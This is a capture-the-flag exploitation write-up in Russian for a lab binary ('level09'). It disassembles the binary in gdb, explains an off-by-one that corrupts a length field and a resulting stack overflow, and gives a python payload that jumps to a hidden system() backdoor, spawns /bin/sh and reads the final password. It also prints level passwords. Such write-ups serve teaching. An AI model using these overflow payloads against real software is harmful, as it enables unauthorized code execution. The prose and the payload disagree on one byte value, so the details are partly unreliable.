> su level09
Password:fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

> ./level09

В востановленном исходнике source.cЭти буферы будут заполнены «set_username» и «set_msg».

В функции set_username для хранения имени пользователя используется локальный буфер размером 0x80 (128) байт. Затем 0x29(41) байт этого локального буфера копируются в буфер имени пользователя в структуре. Поскольку буфер имени пользователя в структуре имеет длину 0x28 (40) байт, 1 байт копируется после и заменяет значение длины сообщения.

В функции set_msg локальный буфер размером 0x400 байт используется для хранения сообщения пользователя, а strncpy будет использовать значение длины сообщения в структуре для заполнения буфера сообщения внутри структуры. Это означает, что мы можем использовать переполнение буфера, чтобы перезаписать старый eip 'handle_msg'!

Чтобы перезаписать старый eip, нам нужно написать имя пользователя 0x28(40) символов, длину для переполнения и перезаписать старый eip (sizeof(struct s_mail) + padding + old ebp + old eip -> 0xd0), использовать новую строку для конец буфера, заполняем память до нового адреса старого eip.

Для нового адреса есть скрытая функция, которая называется «secret_backdoor». Он читает команду на стандартном вводе и использует ее для «системного» вызова. Для переполнения буфера мы будем использовать адрес этой функции (0x000055555555488c), чтобы использовать этот двоичный файл.

Сначала мы видим скрытую функцию secret_backdoor
(gdb) disass secret_backdoor 
[...] 0x0000555555554894 <+8>: mov rax,QWORD PTR [rip+0x20171d] # 0x555555755fb8 ; stdin 0x000055555555489b <+15>: mov rax,QWORD PTR [rax] 0x000055555555489e <+18>: mov rdx,rax 0x00005555555548a1 <+21>: lea rax,[rbp-0x80] 0x00005555555548a5 <+25>: mov esi,0x80 0x00005555555548aa <+30>: mov rdi,rax 0x00005555555548ad <+33>: call 0x555555554770 fgets@plt ; fgets(shellcode, 0x80, stdin) 0x00005555555548b2 <+38>: lea rax,[rbp-0x80] 0x00005555555548b6 <+42>: mov rdi,rax 0x00005555555548b9 <+45>: call 0x555555554740 system@plt ; system(shellcode) [...]
Она выполняет все, что мы пишем в стандартном вводе

(gdb) disass handle_msg 
[...] 0x00005555555548cb <+11>: lea rax,[rbp-0xc0] ; struct msg 192 bytes 0x00005555555548d2 <+18>: add rax,0x8c ; 140 bytes 0x00005555555548d8 <+24>: mov QWORD PTR [rax],0x0 0x00005555555548df <+31>: mov QWORD PTR [rax+0x8],0x0 0x00005555555548e7 <+39>: mov QWORD PTR [rax+0x10],0x0 0x00005555555548ef <+47>: mov QWORD PTR [rax+0x18],0x0 0x00005555555548f7 <+55>: mov QWORD PTR [rax+0x20],0x0 ; 40 bytes 0x00005555555548ff <+63>: mov DWORD PTR [rbp-0xc],0x8c ; 8 bytes [...]
Здесь мы видим структуру, которая может выглядеть так:
typedef struct msg { char content[140]; char username[40]; size_t size; } msg_t;

(gdb) disass set_username 
[...] 0x0000555555554a38 <+107>: call 0x555555554770 fgets@plt ; fgets(username, 128, stdin) 0x0000555555554a3d <+112>: mov DWORD PTR [rbp-0x4],0x0 ; idx = 0 0x0000555555554a44 <+119>: jmp 0x555555554a6a <set_username+157> 0x0000555555554a46 <+121>: mov eax,DWORD PTR [rbp-0x4] 0x0000555555554a49 <+124>: cdqe 0x0000555555554a4b <+126>: movzx ecx,BYTE PTR [rbp+rax1-0x90] 0x0000555555554a53 <+134>: mov rdx,QWORD PTR [rbp-0x98] 0x0000555555554a5a <+141>: mov eax,DWORD PTR [rbp-0x4] 0x0000555555554a5d <+144>: cdqe 0x0000555555554a5f <+146>: mov BYTE PTR [rdx+rax1+0x8c],cl 0x0000555555554a66 <+153>: add DWORD PTR [rbp-0x4],0x1 ; idx += 1 0x0000555555554a6a <+157>: cmp DWORD PTR [rbp-0x4],0x28 ; if (idx > 40) 0x0000555555554a6e <+161>: jg 0x555555554a81 <set_username+180> 0x0000555555554a70 <+163>: mov eax,DWORD PTR [rbp-0x4] 0x0000555555554a73 <+166>: cdqe 0x0000555555554a75 <+168>: movzx eax,BYTE PTR [rbp+rax*1-0x90] 0x0000555555554a7d <+176>: test al,al 0x0000555555554a7f <+178>: jne 0x555555554a46 <set_username+121> [...]
В функции set_username мы видим, что 41 байт может быть записан в msg->username, длина которого составляет всего 40 байт.

Мы можем переполнить это, чтобы перезаписать следующую переменную, которая является размером для strncpy в функции set_msg.
(gdb) disass set_msg 
[...] 0x0000555555554981 <+79>: mov rax,QWORD PTR [rip+0x201630] # 0x555555755fb8 ; stdin 0x0000555555554988 <+86>: mov rax,QWORD PTR [rax] 0x000055555555498b <+89>: mov rdx,rax 0x000055555555498e <+92>: lea rax,[rbp-0x400] ; local_msg 0x0000555555554995 <+99>: mov esi,0x400 0x000055555555499a <+104>: mov rdi,rax 0x000055555555499d <+107>: call 0x555555554770 fgets@plt ; fgets(local_msg, 0x400, stdin) 0x00005555555549a2 <+112>: mov rax,QWORD PTR [rbp-0x408] ; msg 0x00005555555549a9 <+119>: mov eax,DWORD PTR [rax+0xb4] 0x00005555555549af <+125>: movsxd rdx,eax 0x00005555555549b2 <+128>: lea rcx,[rbp-0x400] ; local_msg 0x00005555555549b9 <+135>: mov rax,QWORD PTR [rbp-0x408] ; msg 0x00005555555549c0 <+142>: mov rsi,rcx 0x00005555555549c3 <+145>: mov rdi,rax 0x00005555555549c6 <+148>: call 0x555555554720 strncpy@plt ; strcpy(msg->content, local_msg, msg->size) [...]


(gdb) quit
Здесь мы пишем 40 'A' байт, затем перезаписываем размер в структуре с помощью '\xff' == 255 > 140 (размер поля содержимого), а затем добавляем '\n' для fgets
> (python -c "print 40 * 'A' + '\xd0' + '\n' + 'a' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'"; cat) | ./level09

> cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

The end!!!